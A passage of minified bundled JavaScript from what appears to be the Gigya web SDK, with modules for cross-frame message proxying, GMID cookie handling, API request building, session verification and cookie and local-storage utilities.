                          return this._win.clearTimeout(c), [7];
                        case 5:
                          return [2];
                      }
                    });
                  });
                })];
              });
            });
          }, e;
        }();
      t.RequestProvider = o;
    },
    84: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(25),
        r = i(67),
        a = function () {
          function e(e, t, i, a, s) {
            var u = this;
            void 0 === t && (t = o.getParentUrl()), void 0 === i && (i = o.getAllClassMethodsNames(e)), void 0 === a && (a = window.parent), void 0 === s && (s = window), this._service = e, this.origin = t, this._allowedMethods = i, this._target = a, this._win = s, this.stopCancellers = [], this._listening = !1, this.onRequest = function (e) {
              return n.__awaiter(u, void 0, void 0, function () {
                var t, i;
                return n.__generator(this, function (n) {
                  switch (n.label) {
                    case 0:
                      if (!o.validateOrigin(this.origin, e.origin)) return [3, 7];
                      t = JSON.parse(e.data), n.label = 1;
                    case 1:
                      return n.trys.push([1, 6,, 7]), r.isSignalRequest(t) ? [4, this.handleSignalRequest(t)] : [3, 3];
                    case 2:
                      return n.sent(), [3, 5];
                    case 3:
                      return [4, this.handleProxyRequest(t)];
                    case 4:
                      n.sent(), n.label = 5;
                    case 5:
                      return [3, 7];
                    case 6:
                      return i = n.sent(), this.postError({
                        res: i.message || i,
                        id: t.id
                      }), [3, 7];
                    case 7:
                      return [2];
                  }
                });
              });
            };
          }
          return Object.defineProperty(e.prototype, "isListening", {
            get: function () {
              return this._listening;
            },
            enumerable: !0,
            configurable: !0
          }), e.prototype.listen = function (e) {
            var t = this;
            this.isListening || this._win.setTimeout(function () {
              t._win.addEventListener("message", t.onRequest, !0), t.postMessage({
                id: void 0,
                signal: "listening",
                res: e
              }), t._listening = !0;
            }, 1);
          }, e.prototype.postError = function (e) {
            e.signal = "error", this.postMessage(e);
          }, e.prototype.stopListen = function () {
            this.isListening && (this._win.removeEventListener("message", this.onRequest, !0), this._listening = !1);
          }, e.prototype.handleSignalRequest = function (e) {
            return n.__awaiter(this, void 0, void 0, function () {
              var t, i, o;
              return n.__generator(this, function (n) {
                switch (n.label) {
                  case 0:
                    switch (e.signal) {
                      case "stop":
                        return [3, 1];
                    }
                    return [3, 7];
                  case 1:
                    return [4, this.getCancelResult()];
                  case 2:
                    return t = n.sent(), i = void 0, t ? [3, 5] : (this.stopListen(), o = void 0, this.onStop && (o = this.onStop()).then ? [4, o] : [3, 4]);
                  case 3:
                    o = n.sent(), n.label = 4;
                  case 4:
                    return i = {
                      id: e.id,
                      signal: "stop",
                      res: o
                    }, [3, 6];
                  case 5:
                    i = {
                      id: e.id,
                      signal: "error",
                      res: t
                    }, n.label = 6;
                  case 6:
                    return this.postMessage(i), [3, 8];
                  case 7:
                    return [3, 8];
                  case 8:
                    return [2];
                }
              });
            });
          }, e.prototype.getCancelResult = function () {
            return n.__awaiter(this, void 0, void 0, function () {
              var e, t, i, o;
              return n.__generator(this, function (n) {
                switch (n.label) {
                  case 0:
                    e = 0, t = this.stopCancellers, n.label = 1;
                  case 1:
                    return e < t.length ? (i = t[e], (o = i()).then ? [4, o] : [3, 3]) : [3, 5];
                  case 2:
                    o = n.sent(), n.label = 3;
                  case 3:
                    if (o) return [2, o];
                    n.label = 4;
                  case 4:
                    return e++, [3, 1];
                  case 5:
                    return [2, void 0];
                }
              });
            });
          }, e.prototype.handleProxyRequest = function (e) {
            return n.__awaiter(this, void 0, void 0, function () {
              var t;
              return n.__generator(this, function (i) {
                switch (i.label) {
                  case 0:
                    return this.validateRequest(e), [4, this.forwardToService(e)];
                  case 1:
                    return t = i.sent(), this.postMessage({
                      id: e.id,
                      res: t
                    }), [2];
                }
              });
            });
          }, e.prototype.validateRequest = function (e) {
            if (!e.id || !e.methodName || this._allowedMethods.indexOf(e.methodName) < 0) throw "proxy request in invalid format";
          }, e.prototype.forwardToService = function (e) {
            return n.__awaiter(this, void 0, void 0, function () {
              var t, i;
              return n.__generator(this, function (n) {
                switch (n.label) {
                  case 0:
                    return t = this._service[e.methodName], (i = t.apply(this._service, e.params)) && i.then ? [4, i] : [3, 2];
                  case 1:
                    i = n.sent(), n.label = 2;
                  case 2:
                    return [2, i];
                }
              });
            });
          }, e.prototype.postMessage = function (e) {
            var t = "object" == typeof e ? JSON.stringify(e) : e;
            this._target.postMessage(t, this.origin);
          }, e;
        }();
      t.ProxyListener = a;
    },
    85: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(2),
        o = i(50);
      !function (e) {
        var t, i;
        function r(e) {
          var i = e.utils.getParamValue(document.cookie, "hasGmid", ";") || function (e) {
            var t,
              i = e.utils.cookie.get("gig_bootstrap_" + e.apiKey);
            return null === (t = e.utils.array.getArrayFromString(i, "_")) || void 0 === t ? void 0 : t.pop();
          }(e);
          return {
            isV3: i === t.ver3,
            isV4: i === t.ver4,
            hasGmid: i
          };
        }
        function a(e, t) {
          void 0 === t && (t = i.cookieFirst);
          var n = r(e);
          return t == i.cookieFirst ? n.hasGmid || e.gmidVersion || "ver3" : e.gmidVersion || n.hasGmid || "ver3";
        }
        function s(e) {
          var t = r(e);
          return Boolean(t.hasGmid) && t.isV4;
        }
        function u(e, t) {
          return (e.partnerSettings.customAPIDomainPrefix || "_gigya") + "_" + t;
        }
        function c() {
          return n.FlagService.forceWebSdkBootstrap && !o.siteData.didForcedBootstrap;
        }
        !function (e) {
          e.ver2 = "ver2", e.ver3 = "ver3", e.ver4 = "ver4";
        }(t = e.HasGmid || (e.HasGmid = {})), function (e) {
          e.cookieFirst = "cookieFirst", e.configFirst = "configFirst";
        }(i = e.VersionSearchStrategy || (e.VersionSearchStrategy = {})), e.getHasGmidParam = r, e.getGmidBootstrapIndicationToken = function (e, t) {
          return void 0 === t && (t = i.cookieFirst), u(e, a(e, t));
        }, e.getActualGmidVersion = a, e.shouldRegenerateGmid = function (e, t) {
          var i = s(e);
          return !t && (c() || !i);
        }, e.hasLatestGmidVersion = s, e.convertHasGmidToBootstrapIndication = u, e.shouldForceBootstrap = c;
      }(t.GmidProvider || (t.GmidProvider = {}));
    },
    86: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(69),
        r = i(3),
        a = i(11),
        s = function () {
          function e(e, t, i, n) {
            var o = this;
            void 0 === n && (n = {}), this.baseDomain = e, this.method = t, this.params = i, this.settings = n, this.retry = 0, this.getUrl = function () {
              return window.gigya._.Uri.parse(o.baseDomain + "/" + o.method);
            };
          }
          return e.prototype.send = function (e) {
            return n.__awaiter(this, void 0, void 0, function () {
              return n.__generator(this, function (t) {
                switch (t.label) {
                  case 0:
                    if (!r.localInfo.isOnLine()) return [2, this.networkErrorResponse()];
                    if (this.isRequestPathManipulated()) return window.gigya.logger.warn("Aborting Request for " + this.method + ". Path manipulation detected."), [2];
                    try {
                      this.params = window.gigya.utils.object.decodeObjectKeys(this.params);
                    } catch (e) {
                      return window.gigya.logger.error("Request API Error - Failed to decode object keys", {
                        exception: e,
                        requestParams: JSON.stringify(this.params)
                      }), [2];
                    }
                    return this.addDefaultParams(), [4, this.performSend(this.getRequestType(), e)];
                  case 1:
                    return [2, t.sent()];
                }
              });
            });
          }, e.prototype.handleResponse = function (e) {
            var t = this;
            if (this.settings.cacheTimeout && window.gigya.utils.sessionCache.set(this.getCacheKey(), 0 == e.errorCode ? e : null), null != this.retryTimerID && window.clearTimeout(this.retryTimerID), 100001 != e.errorCode) return this.dispose(), e;
            var i = this.getDataPendingTimeout(this.retry++);
            i > 0 && window.setTimeout(function () {
              t.send();
            }, i);
          }, e.prototype.getCacheKey = function () {
            return this.method + "_" + window.gigya.utils.keyValue.serialize(this.params);
          }, e.prototype.getFullUrl = function () {
            return this.getUrl().addToSearch(this.getFlattenParams()).href;
          }, e.prototype.addDefaultParams = function () {
            var e, t;
            this.params.sdk = "js_" + ((null === (e = window.gigya.build) || void 0 === e ? void 0 : e.version) || ""), this.params.sdkBuild = (null === (t = window.gigya.build) || void 0 === t ? void 0 : t.number) || 0;
          }, e.prototype.isRequestPathManipulated = function () {
            return this.getUrl().href.toLowerCase() !== (this.baseDomain + "/" + this.method).toLowerCase() || this.getUrl().search.length > 0;
          }, e.prototype.getDataPendingTimeout = function (e) {
            return e <= 4 ? 500 : e <= 8 ? 1e3 : e <= 21 ? 2e3 : e <= 39 ? 5e3 : -1;
          }, e.prototype.getRequestType = function () {
            return this.isForcePost || this.haveSensitiveParams() || this.requestOversize() ? o.RequestType.POST : o.RequestType.GET;
          }, Object.defineProperty(e.prototype, "isForcePost", {
            get: function () {
              return this.settings.forcePost;
            },
            enumerable: !0,
            configurable: !0
          }), e.prototype.requestOversize = function () {
            var e = this.getRequestUrlLength(),
              t = this.getUrlLengthFields();
            return e + t.extraLength > t.maxLength;
          }, e.prototype.getRequestUrlLength = function () {
            return (this.getUrl().href + window.gigya.utils.keyValue.serialize(this.getFlattenParams())).length;
          }, e.prototype.getUrlLengthFields = function () {
            var e = 0;
            return (window.gigya.localInfo.isIE || window.gigya.localInfo.isEdgeLegacy) && (e = 2048), {
              extraLength: e,
              maxLength: 4096
            };
          }, e.prototype.getFlattenParams = function () {
            return window.gigya.utils.keyValue.deserialize(window.gigya.utils.keyValue.serialize(this.params));
          }, e.prototype.haveSensitiveParams = function () {
            for (var e, t = 0, i = null === a.sensitiveParamsOverride || void 0 === a.sensitiveParamsOverride ? void 0 : a.sensitiveParamsOverride.split("|"); t < i.length; t++) {
              var n = i[t];
              if (null === (e = this.params) || void 0 === e ? void 0 : e.hasOwnProperty(n)) return !0;
            }
          }, e;
        }();
      t.Request = s;
    },
    9: function (module, exports, __webpack_require__) {
      Object.defineProperty(exports, "__esModule", {
        value: !0
      });
      var tslib_1 = __webpack_require__(0),
        DOMUtils = __webpack_require__(13),
        cdn_1 = __webpack_require__(21),
        LocalInfo_1 = __webpack_require__(3);
      function callAsync(e, t) {
        return void 0 === t && (t = {}), tslib_1.__awaiter(this, void 0, void 0, function () {
          return tslib_1.__generator(this, function (i) {
            return [2, new gigya.Promise(function (i) {
              callFunction("gigya." + e, [tslib_1.__assign(tslib_1.__assign({}, t), {
                callback: i
              })]);
            })];
          });
        });
      }
      function callFunction(name, arParams) {
        var fn = eval(name),
          arParts = name.split(".");
        arParts.splice(arParts.length - 1, 1);
        var scope = eval(arParts.join("."));
        fn.apply(scope, arParams);
      }
      function invokeOnPageLoad(e, t) {
        if (!document.readyState && document.body || "complete" === document.readyState || !t && "interactive" === document.readyState && document.body) e();else {
          var i = !1,
            n = function () {
              i || (i = !0, e());
            };
          window.setTimeout(n, 2e4), DOMUtils.addEventListener(window, "load", n), DOMUtils.addEventListener(document, "DOMContentLoaded", n);
        }
      }
      function createAlias(e, t) {
        for (var i = e.split("."), n = window, o = 0; o < i.length - 1; o++) {
          var r = i[o];
          n[r] || (n[r] = {}), n = n[r];
        }
        n[i[i.length - 1]] = t;
      }
      function debounce(e, t) {
        var i = void 0;
        return function () {
          void 0 !== i && clearTimeout(i), i = setTimeout(function () {
            i = void 0, e();
          }, t);
        };
      }
      function addSrcToIFrameIfNeeded(e, t) {
        void 0 === t && (t = cdn_1.getCdnResource("/")), (LocalInfo_1.localInfo.isIOSWebView || LocalInfo_1.localInfo.isIOS && LocalInfo_1.localInfo.isWeChat) && e.setAttribute("src", t);
      }
      exports.callAsync = callAsync, exports.callFunction = callFunction, exports.invokeOnPageLoad = invokeOnPageLoad, exports.createAlias = createAlias, exports.debounce = debounce, exports.addSrcToIFrameIfNeeded = addSrcToIFrameIfNeeded;
    },
    94: function (e, t) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), function (e) {
        e[e.Social = 0] = "Social", e[e.Sso = 1] = "Sso";
      }(t.OAuthMode || (t.OAuthMode = {}));
    },
    98: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(24),
        r = i(42),
        a = i(31),
        s = i(33);
      function u(e) {
        return void 0 === e && (e = window.gigya.thisScript.APIKey), n.__awaiter(this, void 0, void 0, function () {
          var t, i;
          return n.__generator(this, function (n) {
            switch (n.label) {
              case 0:
                return window.gigya.logger.info("sync login token from group"), [4, a.SsoService.getInstance()];
              case 1:
                return [4, null == (t = n.sent()) ? void 0 : t.getToken()];
              case 2:
                return i = n.sent(), [4, o.setFromSsoResponse(i, e)];
              case 3:
                return n.sent(), [2, o.get(e)];
            }
          });
        });
      }
      t.hasSession = function () {
        var e, t, i, a;
        return n.__awaiter(this, void 0, void 0, function () {
          var c, l, g, d, f, p;
          return n.__generator(this, function (n) {
            switch (n.label) {
              case 0:
                return c = window.gigya.logger.group("hasSession"), l = (null === (t = null === (e = window.gigya.thisScript) || void 0 === e ? void 0 : e.globalConf) || void 0 === t ? void 0 : t.APIKey) || (null === (i = window.gigya.thisScript) || void 0 === i ? void 0 : i.APIKey), window.gigya.logger.info("checking session exist for apiKey: " + l), (null === (a = window.gigya.thisScript) || void 0 === a ? void 0 : a.APIKey) !== l && window.gigya.logger.info("effective apiKey for checking session and the apiKey that the script was loaded with are different"), (g = o.get()) || !window.gigya.partnerSettings.ssoKey ? [3, 2] : (window.gigya.logger.info("SSO group, sync login token from group"), [4, u(l)]);
              case 1:
                g = n.sent(), n.label = 2;
              case 2:
                return g ? r.sessionData.isSessionVerified(g) ? (window.gigya.logger.info("login token exist and session is already verified, session is valid"), c.end(), [2, !0]) : [3, 3] : [3, 6];
              case 3:
                return window.gigya.logger.info("login token exist and session is not verified, verifying session..."), [4, s.promisify(window.gigya.accounts.verifyLogin)];
              case 4:
                return d = n.sent(), f = 0 == (null == d ? void 0 : d.errorCode), r.sessionData.setIsSessionVerified(g, f), window.gigya.logger.info(f ? "session verified" : "session is not verified"), c.end(), [2, f];
              case 5:
                return [3, 7];
              case 6:
                return (p = window.gigya.utils.URL.getParamsFromURL(document.location.href)).errorCode && p.regToken ? (window.gigya.logger.info("user is returned from redirect, wait for login completion"), c.end(), [2, new gigya.Promise(function (e) {
                  window.gigya.accounts.addEventHandlers({
                    onLogin: function () {
                      return e(!0);
                    }
                  });
                })]) : (window.gigya.logger.info("login token doesn't exist"), c.end(), [2, !1]);
              case 7:
                return [2];
            }
          });
        });
      }, t.syncGroupToken = u;
    }
  });
  /*! For license information please see gigya.adapters.mobile.min.js.LICENSE.txt */
  !function (e) {
    var t = {};
    function n(o) {
      if (t[o]) return t[o].exports;
      var i = t[o] = {
        i: o,
        l: !1,
        exports: {}
      };
      return e[o].call(i.exports, i, i.exports, n), i.l = !0, i.exports;
    }
    n.m = e, n.c = t, n.d = function (e, t, o) {
      n.o(e, t) || Object.defineProperty(e, t, {
        enumerable: !0,
        get: o
      });
    }, n.r = function (e) {
      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
        value: "Module"
      }), Object.defineProperty(e, "__esModule", {
        value: !0
      });
    }, n.t = function (e, t) {
      if (1 & t && (e = n(e)), 8 & t) return e;
      if (4 & t && "object" == typeof e && e && e.__esModule) return e;
      var o = Object.create(null);
      if (n.r(o), Object.defineProperty(o, "default", {
        enumerable: !0,
        value: e
      }), 2 & t && "string" != typeof e) for (var i in e) n.d(o, i, function (t) {
        return e[t];
      }.bind(null, i));
      return o;
    }, n.n = function (e) {
      var t = e && e.__esModule ? function () {
        return e.default;
      } : function () {
        return e;
      };
      return n.d(t, "a", t), t;
    }, n.o = function (e, t) {
      return Object.prototype.hasOwnProperty.call(e, t);
    }, n.p = "", n(n.s = 314);
  }({
    0: function (e, t, n) {
      "use strict";

      n.r(t), function (e) {
        n.d(t, "__extends", function () {
          return i;
        }), n.d(t, "__assign", function () {
          return r;
        }), n.d(t, "__rest", function () {
          return a;
        }), n.d(t, "__decorate", function () {
          return s;
        }), n.d(t, "__param", function () {
          return u;
        }), n.d(t, "__metadata", function () {
          return c;
        }), n.d(t, "__awaiter", function () {
          return l;
        }), n.d(t, "__generator", function () {
          return f;
        }), n.d(t, "__exportStar", function () {
          return d;
        }), n.d(t, "__values", function () {
          return p;
        }), n.d(t, "__read", function () {
          return g;
        }), n.d(t, "__spread", function () {
          return v;
        }), n.d(t, "__spreadArrays", function () {
          return h;
        }), n.d(t, "__await", function () {
          return m;
        }), n.d(t, "__asyncGenerator", function () {
          return y;
        }), n.d(t, "__asyncDelegator", function () {
          return w;
        }), n.d(t, "__asyncValues", function () {
          return _;
        }), n.d(t, "__makeTemplateObject", function () {
          return b;
        }), n.d(t, "__importStar", function () {
          return S;
        }), n.d(t, "__importDefault", function () {
          return O;
        }), n.d(t, "__classPrivateFieldGet", function () {
          return x;
        }), n.d(t, "__classPrivateFieldSet", function () {
          return I;
        });
        var o = function (e, t) {
          return (o = Object.setPrototypeOf || {
            __proto__: []
          } instanceof Array && function (e, t) {
            e.__proto__ = t;
          } || function (e, t) {
            for (var n in t) t.hasOwnProperty(n) && (e[n] = t[n]);
          })(e, t);
        };
        function i(e, t) {
          function n() {
            this.constructor = e;
          }
          o(e, t), e.prototype = null === t ? Object.create(t) : (n.prototype = t.prototype, new n());
        }
        var r = function () {
          return (r = e || function (e) {
            for (var t, n = 1, o = arguments.length; n < o; n++) for (var i in t = arguments[n]) Object.prototype.hasOwnProperty.call(t, i) && (e[i] = t[i]);
            return e;
          }).apply(this, arguments);
        };
        function a(e, t) {
          var n = {};
          for (var o in e) Object.prototype.hasOwnProperty.call(e, o) && t.indexOf(o) < 0 && (n[o] = e[o]);
          if (null != e && "function" == typeof Object.getOwnPropertySymbols) {
            var i = 0;
            for (o = Object.getOwnPropertySymbols(e); i < o.length; i++) t.indexOf(o[i]) < 0 && Object.prototype.propertyIsEnumerable.call(e, o[i]) && (n[o[i]] = e[o[i]]);
          }
          return n;
        }
        function s(e, t, n, o) {
          var i,
            r = arguments.length,
            a = r < 3 ? t : null === o ? o = Object.getOwnPropertyDescriptor(t, n) : o;
          if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) a = Reflect.decorate(e, t, n, o);else for (var s = e.length - 1; s >= 0; s--) (i = e[s]) && (a = (r < 3 ? i(a) : r > 3 ? i(t, n, a) : i(t, n)) || a);
          return r > 3 && a && Object.defineProperty(t, n, a), a;
        }
        function u(e, t) {
          return function (n, o) {
            t(n, o, e);
          };
        }
        function c(e, t) {
          if ("object" == typeof Reflect && "function" == typeof Reflect.metadata) return Reflect.metadata(e, t);
        }
        function l(e, t, n, o) {
          return new (n || (n = gigya.Promise))(function (i, r) {
            function a(e) {
              try {
                u(o.next(e));
              } catch (e) {
                r(e);
              }
            }
            function s(e) {
              try {
                u(o.throw(e));
              } catch (e) {
                r(e);
              }
            }
            function u(e) {
              var t;
              e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n(function (e) {
                e(t);
              })).then(a, s);
            }
            u((o = o.apply(e, t || [])).next());
          });
        }
        function f(e, t) {
          var n,
            o,
            i,
            r,
            a = {
              label: 0,
              sent: function () {
                if (1 & i[0]) throw i[1];
                return i[1];
              },
              trys: [],
              ops: []
            };
          return r = {
            next: s(0),
            throw: s(1),
            return: s(2)
          }, "function" == typeof Symbol && (r[Symbol.iterator] = function () {
            return this;
          }), r;
          function s(r) {
            return function (s) {
              return function (r) {
                if (n) throw new TypeError("Generator is already executing.");
                for (; a;) try {
                  if (n = 1, o && (i = 2 & r[0] ? o.return : r[0] ? o.throw || ((i = o.return) && i.call(o), 0) : o.next) && !(i = i.call(o, r[1])).done) return i;
                  switch (o = 0, i && (r = [2 & r[0], i.value]), r[0]) {
                    case 0:
                    case 1:
                      i = r;
                      break;
                    case 4:
                      return a.label++, {
                        value: r[1],
                        done: !1
                      };
                    case 5:
                      a.label++, o = r[1], r = [0];
                      continue;
                    case 7:
                      r = a.ops.pop(), a.trys.pop();
                      continue;
                    default:
                      if (!(i = a.trys, (i = i.length > 0 && i[i.length - 1]) || 6 !== r[0] && 2 !== r[0])) {
                        a = 0;
                        continue;
                      }
                      if (3 === r[0] && (!i || r[1] > i[0] && r[1] < i[3])) {
                        a.label = r[1];
                        break;
                      }
                      if (6 === r[0] && a.label < i[1]) {
                        a.label = i[1], i = r;
                        break;
                      }
                      if (i && a.label < i[2]) {
                        a.label = i[2], a.ops.push(r);
                        break;
                      }
                      i[2] && a.ops.pop(), a.trys.pop();
                      continue;
                  }
                  r = t.call(e, a);
                } catch (e) {
                  r = [6, e], o = 0;
                } finally {
                  n = i = 0;
                }
                if (5 & r[0]) throw r[1];
                return {
                  value: r[0] ? r[1] : void 0,
                  done: !0
                };
              }([r, s]);
            };
          }
        }
        function d(e, t) {
          for (var n in e) t.hasOwnProperty(n) || (t[n] = e[n]);
        }
        function p(e) {
          var t = "function" == typeof Symbol && Symbol.iterator,
            n = t && e[t],
            o = 0;
          if (n) return n.call(e);
          if (e && "number" == typeof e.length) return {
            next: function () {
              return e && o >= e.length && (e = void 0), {
                value: e && e[o++],
                done: !e
              };
            }
          };
          throw new TypeError(t ? "Object is not iterable." : "Symbol.iterator is not defined.");
        }
        function g(e, t) {
          var n = "function" == typeof Symbol && e[Symbol.iterator];
          if (!n) return e;
          var o,
            i,
            r = n.call(e),
            a = [];
          try {
            for (; (void 0 === t || t-- > 0) && !(o = r.next()).done;) a.push(o.value);
          } catch (e) {
            i = {
              error: e
            };
          } finally {
            try {
              o && !o.done && (n = r.return) && n.call(r);
            } finally {
              if (i) throw i.error;
            }
          }
          return a;
        }
        function v() {
          for (var e = [], t = 0; t < arguments.length; t++) e = e.concat(g(arguments[t]));
          return e;
        }
        function h() {
          for (var e = 0, t = 0, n = arguments.length; t < n; t++) e += arguments[t].length;
          var o = Array(e),
            i = 0;
          for (t = 0; t < n; t++) for (var r = arguments[t], a = 0, s = r.length; a < s; a++, i++) o[i] = r[a];
          return o;
        }
        function m(e) {
          return this instanceof m ? (this.v = e, this) : new m(e);
        }
        function y(e, t, n) {
          if (!Symbol.asyncIterator) throw new TypeError("Symbol.asyncIterator is not defined.");
          var o,
            i = n.apply(e, t || []),
            r = [];
          return o = {}, a("next"), a("throw"), a("return"), o[Symbol.asyncIterator] = function () {
            return this;
          }, o;
          function a(e) {
            i[e] && (o[e] = function (t) {
              return new gigya.Promise(function (n, o) {
                r.push([e, t, n, o]) > 1 || s(e, t);
              });
            });
          }
          function s(e, t) {
            try {
              (n = i[e](t)).value instanceof m ? gigya.Promise.resolve(n.value.v).then(u, c) : l(r[0][2], n);
            } catch (e) {
              l(r[0][3], e);
            }
            var n;
          }
          function u(e) {
            s("next", e);
          }
          function c(e) {
            s("throw", e);
          }
          function l(e, t) {
            e(t), r.shift(), r.length && s(r[0][0], r[0][1]);
          }
        }
        function w(e) {
          var t, n;
          return t = {}, o("next"), o("throw", function (e) {
            throw e;
          }), o("return"), t[Symbol.iterator] = function () {
            return this;
          }, t;
          function o(o, i) {
            t[o] = e[o] ? function (t) {
              return (n = !n) ? {
                value: m(e[o](t)),
                done: "return" === o
              } : i ? i(t) : t;
            } : i;
          }
        }
        function _(e) {
          if (!Symbol.asyncIterator) throw new TypeError("Symbol.asyncIterator is not defined.");
          var t,
            n = e[Symbol.asyncIterator];
          return n ? n.call(e) : (e = p(e), t = {}, o("next"), o("throw"), o("return"), t[Symbol.asyncIterator] = function () {
            return this;
          }, t);
          function o(n) {
            t[n] = e[n] && function (t) {
              return new gigya.Promise(function (o, i) {
                (function (e, t, n, o) {
                  gigya.Promise.resolve(o).then(function (t) {
                    e({
                      value: t,
                      done: n
                    });
                  }, t);
                })(o, i, (t = e[n](t)).done, t.value);
              });
            };
          }
        }
        function b(e, t) {
          return Object.defineProperty ? Object.defineProperty(e, "raw", {
            value: t
          }) : e.raw = t, e;
        }
        function S(e) {
          if (e && e.__esModule) return e;
          var t = {};
          if (null != e) for (var n in e) Object.hasOwnProperty.call(e, n) && (t[n] = e[n]);
          return t.default = e, t;
        }
        function O(e) {
          return e && e.__esModule ? e : {
            default: e
          };
        }
        function x(e, t) {
          if (!t.has(e)) throw new TypeError("attempted to get private field on non-instance");
          return t.get(e);
        }
        function I(e, t, n) {
          if (!t.has(e)) throw new TypeError("attempted to set private field on non-instance");
          return t.set(e, n), n;
        }
      }.call(this, n(0).__assign);
    },
    12: function (e, t, n) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var o = n(0),
        i = n(3),
        r = n(28),
        a = function () {
          function e(e) {
            void 0 === e && (e = new r.CookieStore()), this._cookieStore = e;
          }
          return e.prototype.set = function (e, t, n, o, r, a) {
            null == o && (o = this.getDefaultDomain());
            var s = r ? "" : "/",
              u = this._getExpirationInMs(n),
              c = null;
            null != u && (c = new Date()).setTime(c.getTime() + u);
            var l = this._setCookieInternal(e, t, s, c, o, a),
              f = !u || u > 0;
            if (f === l) return !0;
            var d = i.localInfo.pageDomain;
            return (l = this._setCookieInternal(e, t, s, c, d, a)) === f;
          }, e.prototype.get = function (e) {
            return this._cookieStore.getCookie(e);
          }, e.prototype.remove = function (e, t) {
            void 0 === t && (t = i.localInfo.pageDomain), this._removeFromBaseDomains(e, t), this.set(e, "", -1, "", !1), this.set(e, "", -1, "", !0);
          }, e.prototype.getInfiniteExpirationTimeInSeconds = function () {
            return 31536e3;
          }, e.prototype.canSaveCookie = function (t) {
            void 0 === t && (t = null);
            try {
              return this.set(e.testCookieName, "true", 1, t, null);
            } catch (e) {
              return !1;
            }
          }, e.prototype.getDefaultDomain = function (e, t) {
            return void 0 === e && (e = i.localInfo.pageDomain), void 0 === t && (t = i.localInfo.baseDomain || ""), t.length > 0 && e.length >= t.length && e.lastIndexOf(t) === e.length - t.length ? t : e;
          }, e.prototype._getExpirationInMs = function (e) {
            return null == e || "" === e || isNaN(e) ? 1e3 * this.getInfiniteExpirationTimeInSeconds() : 0 == e ? null : 1e3 * e;
          }, e.prototype._setCookieInternal = function (t, n, o, r, a, s) {
            var u;
            void 0 === s && (s = e._getSameSiteMode());
            var c = 0 === (null !== (u = null === i.localInfo || void 0 === i.localInfo ? void 0 : i.localInfo.protocol) && void 0 !== u ? u : document.location.protocol).indexOf("https");
            return this._cookieStore.setCookie(t, n, {
              path: o,
              expires: r,
              domain: a,
              sameSite: s,
              secure: c
            }), !!this.get(t) || !!s && ("None" !== s && this._fallbackToSameSiteNone(t, n, o, r, a, c), this.get(t) ? (this._reportFallback("Setting SameSite=None", {
              name: t,
              value: n,
              sameSiteMode: s
            }), !0) : (this._cookieStore.setCookie(t, n, {
              path: o,
              expires: r,
              domain: a,
              secure: c
            }), !!this.get(t) && (this._reportFallback("Cookie established only without sameSite mode", {
              name: t,
              value: n,
              sameSiteMode: s
            }), !0)));
          }, e.prototype._removeFromBaseDomains = function (e, t) {
            for (var n = t.split("."), o = 0; o < n.length - 1; o++) {
              var i = n.slice(o).join(".");
              this.set(e, "", -1, i, !1), this.set(e, "", -1, i, !0);
            }
          }, e._getSameSiteMode = function () {
            if (!e._disallowSameSiteMode()) return "None";
          }, e._disallowSameSiteMode = function () {
            var e,
              t,
              n = null !== (e = null === i.localInfo || void 0 === i.localInfo ? void 0 : i.localInfo.protocol) && void 0 !== e ? e : document.location.protocol,
              o = null !== (t = null === i.localInfo || void 0 === i.localInfo ? void 0 : i.localInfo.userAgent) && void 0 !== t ? t : navigator.userAgent.toLowerCase();
            return !(0 === n.indexOf("https")) || !o || o.indexOf("CPU iPhone OS 12") > -1 || o.indexOf("iPad; CPU OS 12") > -1 || o.indexOf("Macintosh; Intel Mac OS X 10_14") > -1 && o.indexOf("Version/") > -1 && o.indexOf("Safari") > -1 || o.indexOf("Chrome/5") > -1 && o.indexOf("Chrome/6") > -1;
          }, e.prototype._fallbackToSameSiteNone = function (e, t, n, o, i, r) {
            this._cookieStore.setCookie(e, t, {
              path: n,
              expires: o,
              domain: i,
              sameSite: "None",
              secure: r
            });
          }, e.prototype._reportFallback = function (e, t) {
            window.gigya.logger.report("Cookie Policy Fallback: " + e, o.__assign(o.__assign({}, t), {
              isIframe: this._isIFrame()
            }), !1);
          }, e.prototype._isIFrame = function () {
            var e;
            try {
              return (null === window || void 0 === window ? void 0 : window.location) !== (null === (e = null === window || void 0 === window ? void 0 : window.parent) || void 0 === e ? void 0 : e.location);
            } catch (e) {
              return !0;
            }
          }, e.testCookieName = "gig3pctest", e;
        }();
      t.CookieUtils = a, t.default = new a();
    },
    14: function (e, t, n) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var o = n(0),
        i = n(5),
        r = n(3),
        a = n(12),
        s = function () {
          function e() {}
          return e.getName = function () {
            return "AbstractAdapter";
          }, e.prototype.setObject = function (e, t) {
            this.setItem(e, i.serialize(t));
          }, e.prototype.getObject = function (e, t) {
            return i.deserialize(this.getItem(e), t);
          }, e.prototype.isPersistent = function () {
            return !0;
          }, e;
        }();
      t.AbstractLocalStorageAdapter = s;
      var u = function (e) {
        function t() {
          var t = e.call(this) || this;
          return t.isLoaded = !1, t;
        }
        return o.__extends(t, e), t.prototype.isReady = function () {
          return this.isLoaded;
        }, t.prototype.waitForService = function (e) {
          var t = this;
          this.isReady() ? e() : setTimeout(function () {
            return t.waitForService(e);
          }, 50);
        }, t;
      }(s);
      t.AbstractAsyncLocalStorageAdapter = u;
      var c = function (e) {
          function t() {
            return null !== e && e.apply(this, arguments) || this;
          }
          return o.__extends(t, e), t.prototype.getItem = function (e) {
            return this.storage[e];
          }, t.prototype.setItem = function (e, t, n) {
            try {
              this.storage[e] = t;
            } catch (e) {}
          }, t.prototype.removeItem = function (e) {
            this.storage.removeItem(e);
          }, t;
        }(s),
        l = function (e) {
          function t() {
            var t = e.call(this) || this;
            return t.storage = window.localStorage, t;
          }
          return o.__extends(t, e), t.getName = function () {
            return "LocalStorageAdapter";
          }, t.isAvailable = function () {
            return r.localInfo.supportsLocalStorage;
          }, t;
        }(c),
        f = function (e) {
          function t() {
